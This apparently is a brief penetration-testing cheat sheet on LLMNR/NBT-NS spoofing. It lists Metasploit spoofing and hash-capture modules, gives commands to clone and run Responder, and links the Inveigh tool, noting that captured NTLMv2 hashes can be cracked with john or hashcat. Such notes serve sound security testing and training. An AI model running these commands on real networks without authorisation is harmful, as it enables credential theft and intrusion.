# LLMNR / NBT NS Spoofing

## Metasplpoit

`auxiliary/spoof/llmnr/llmnr_response`   
`auxiliary/spoof/nbns/nbns_response` 

Capture the hashes: 

`auxiliary/server/capture/smb`   
`auxiliary/server/capture/http_ntlm` 

You’ll end up with NTLMv2 hash, use john or hashcat to crack it. 

## Responder

Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication.

```text
git clone https://github.com/lgandx/Responder 
python Responder.py -i local-ip -I eth0 
```

## C\# version - Inveigh

Windows PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer/man-in-the-middle tool

[https://github.com/Kevin-Robertson/InveighZero](https://github.com/Kevin-Robertson/InveighZero)

